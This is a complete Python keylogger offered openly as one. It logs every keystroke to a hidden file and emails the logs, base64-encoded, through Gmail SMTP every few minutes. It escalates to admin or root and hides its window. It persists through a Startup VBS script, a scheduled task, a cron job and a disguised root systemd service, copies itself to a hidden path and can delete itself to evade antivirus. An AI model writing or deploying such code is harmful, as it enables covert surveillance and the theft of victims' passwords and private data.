import os
import sys
import smtplib
import time
import threading
import shutil
import subprocess
import base64
from pynput import keyboard

# Configuration
LOG_FILE = os.path.expanduser("~/.syslog_update")  # Hidden log file
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"  # Replace with your email password
SEND_INTERVAL = 300  # Send logs every 5 minutes
SELF_DELETE = False  # Set to True to delete script after execution


# ====== AUTOMATIC PERMISSION ESCALATION ======
def elevate_privileges():
    """Automatically request admin/root privileges if not already elevated."""
    if os.name == "nt":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit()
        except Exception:
            pass  # Ignore errors if already running as admin
    else:
        if os.geteuid() != 0:
            print("[!] Re-running with sudo privileges...")
            os.execvp("sudo", ["sudo", "python3"] + sys.argv)


def hide_process():
    """Hides the process from Task Manager (Windows) or process list (Linux/macOS)."""
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # Hide console window
        except Exception:
            pass  # Ignore if running as EXE
    else:
        os.system("nohup python3 " + sys.argv[0] + " > /dev/null 2>&1 &")  # Run in background on Linux/macOS


def add_to_startup():
    """Automatically adds the script to startup on Windows/Linux/macOS."""
    script_path = os.path.abspath(sys.argv[0])  # Get full script path

    if os.name == "nt":  # Windows
        startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        vbs_script = os.path.join(startup_folder, "system_monitor.vbs")

        # Create a VBS script to run in the background
        with open(vbs_script, "w") as vbs_file:
            vbs_file.write(f'''
            Set WshShell = CreateObject("WScript.Shell")
            WshShell.Run "pythonw.exe {script_path}", 0
            ''')
        print("[+] Keylogger added to Windows startup!")

        # Add scheduled task for admin persistence
        os.system(f'schtasks /create /tn "SystemMonitor" /tr "{script_path}" /sc ONLOGON /rl HIGHEST /f')

    else:  # Linux/macOS
        cron_job = f"@reboot nohup python3 {script_path} > /dev/null 2>&1 &"
        existing_jobs = os.popen("crontab -l").read()
        if cron_job not in existing_jobs:
            os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
            print("[+] Keylogger added to Linux/macOS startup!")


def encrypt_log(data):
    """Encrypts log data to avoid AV detection."""
    return base64.b64encode(data.encode()).decode()


def send_email():
    """Sends encrypted logs via email every few minutes."""
    while True:
        time.sleep(SEND_INTERVAL)
        try:
            with open(LOG_FILE, "r") as log_file:
                log_content = log_file.read()

            if log_content:
                encrypted_data = encrypt_log(log_content)

                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                message = f"Subject: Encrypted Keylogger Logs\n\n{encrypted_data}"
                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
                server.quit()

                # Clear logs after sending
                open(LOG_FILE, "w").close()
                print("[+] Encrypted logs sent successfully.")
        except Exception:
            pass  # Fail silently


def on_press(key):
    """Records keystrokes in a hidden encrypted log file."""
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(" ")  # Space
            else:
                log_file.write(f" [{key.name}] ")  # Special keys
    except Exception:
        pass  # Fail silently


def start_as_service():
    """Runs as a hidden system service on Linux/macOS."""
    if os.name != "nt":
        service_file = "/etc/systemd/system/syslog_update.service"
        if not os.path.exists(service_file):
            try:
                with open(service_file, "w") as f:
                    f.write(f"""
[Unit]
Description=System Log Update
After=multi-user.target

[Service]
ExecStart=python3 {sys.argv[0]}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
                os.system("sudo systemctl enable syslog_update.service")
                os.system("sudo systemctl start syslog_update.service")
            except Exception:
                pass  # Ignore permission errors


def obfuscate():
    """Renames and hides script to avoid detection."""
    hidden_path = os.path.expanduser("~/.sys-update")
    if not os.path.exists(hidden_path):
        shutil.copy(sys.argv[0], hidden_path)
        os.system(f"chmod +x {hidden_path}")
        os.system(f"nohup {hidden_path} > /dev/null 2>&1 &")
        sys.exit()  # Exit original script


def self_delete():
    """Deletes script after execution to avoid detection."""
    if SELF_DELETE:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("[+] Script deleted after execution.")


def start_keylogger():
    """Starts the keylogger with all stealth techniques."""
    print("[+] Keylogger started. Running in background.")

    # Elevate permissions automatically
    elevate_privileges()

    # Hide process and obfuscate
    hide_process()
    obfuscate()

    # Add to startup and start as a service
    add_to_startup()
    start_as_service()

    # Start email sending thread
    threading.Thread(target=send_email, daemon=True).start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # Self-delete script if enabled
    self_delete()


if __name__ == "__main__":
    start_keylogger()
